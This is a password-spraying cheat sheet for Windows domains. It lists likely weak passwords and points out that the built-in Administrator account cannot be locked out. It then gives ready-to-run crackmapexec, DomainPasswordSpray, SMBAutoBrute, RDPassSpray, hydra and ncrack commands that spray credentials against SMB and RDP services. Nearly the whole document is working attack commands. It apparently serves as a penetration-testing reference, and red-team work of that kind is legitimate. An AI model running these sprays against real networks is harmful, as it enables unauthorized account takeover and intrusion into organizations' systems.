### Password spray attacks use one password against multiple users, usually gathered in a users wordlist.

### They are also preferred from brute-force attacks due to prevention of account lockouts.

## TIP: The builtin Administrator account (RID:500) cannot be locked out of the system no matter how many failed logon attempts it accumulates.

#### Tools: hydra, RDPassSpray.py, MailSniper, SprayingToolkit, Metasploit (auxiliary/scanner/smb/smb_login) example

### Most of the time the best passwords to spray are :

 - P@ssw0rd01 , Password123 , Password1 , Hello123 , mimikatz

 - Welcome1 / Welcome01

 - $Companyname1 : $Microsoft1

 - SeasonYear : Winter2019* , Spring2020! , Summer2018? , Summer2020 , July2020!

 - Default AD password with simple mutations such as number-1, special character iteration (*,?,!,#)

 - Empty Password (Hash:31d6cfe0d16ae931b73c59d7e0c089c0)

## Spray a pre-generated passwords list

#### 1) Using crackmapexec and mp64 to generate passwords and spray them against SMB services on the network.

 - crackmapexec smb 10.0.0.1/24 -u Administrator -p '(./mp64.bin Pass@wor?l?a)'

#### 2) Using DomainPasswordSpray to spray a password against all users of a domain https://github.com/dafthack/DomainPasswordSpray

 - Invoke-DomainPasswordSpray -Password Summer2021! (Automatically creates a userlist from the users in the domain and sprays the password)

 - Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt

#### 3) SMBAutoBrute https://github.com/Shellntel/scripts/blob/master/Invoke-SMBAutoBrute.ps1

 - Invoke-SMBAutoBrute -UserList "C:\ProgramData\admins.txt" -PasswordList "Password1"

## Spray passwords against the RDP service

#### 1) Using RDPassSpray to target RDP services https://github.com/xFreed0m/RDPassSpray

 - python3 RDPassSpray.py -u [USERNAME] -p [PASSWORD] -d [DOMAIN] -t [TARGET IP]

#### 2) Hydra

 - hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://IP_ADDRESS

#### 3) ncrack

 - ncrack –connection-limit 1 -vv --user administrator -P password-file.txt rdp://IP_ADDRESS



